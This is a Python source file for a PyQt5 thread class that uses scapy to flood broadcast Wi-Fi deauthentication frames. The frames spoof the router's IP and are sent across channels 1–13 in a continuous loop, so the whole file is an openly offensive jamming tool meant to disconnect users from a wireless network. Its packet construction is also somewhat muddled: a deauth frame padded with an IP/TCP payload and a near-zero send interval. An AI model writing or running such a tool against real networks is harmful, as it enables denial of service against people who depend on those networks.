from scapy.layers.l2 import *
from scapy.layers.inet import *
from scapy.all import *
from scapy.layers.dot11 import *
import wifi
import psutil
from ipaddress import *
import netifaces
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *

class JammingThread(QThread):
    jamming_output = pyqtSignal(str)

    def __init__(self, interface, connected_network, router_ip):
        super().__init__()
        self.interface = interface
        self.connected_network = connected_network
        self.router_ip = router_ip
        self.running = False

    def run(self):
        self.running = True
        while self.running:
            self.send_jamming_packets()

    def stop_jamming(self):
        self.running = False

    def send_jamming_packets(self):
        try:
            for channel in range(1, 14):
                self.set_channel(channel)
                
                jamming_packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff")
                jamming_packet.type = 0
                jamming_packet.subtype = 12
                jamming_packet /= LLC(dsap=0xaa, ssap=0xaa)
                jamming_packet /= SNAP(OUI=0x000000, code=0x0800)
                jamming_packet /= IP(src=self.router_ip, dst="255.255.255.255")
                jamming_packet /= TCP(dport=80, sport=2)  
                jamming_packet /= Raw(load="\x00" * 500)  
                
                sendp(jamming_packet, iface=self.interface, count=100, inter=0.000000000000001)

                self.jamming_output.emit(f"Jamming packets sent on channel {channel} (100 packets) ...\n")
        except Exception as e:
            self.jamming_output.emit(f"Error sending packets: {str(e)}\n")

    def set_channel(self, channel):
        subprocess.call(['iwconfig', self.interface, 'channel', str(channel)])

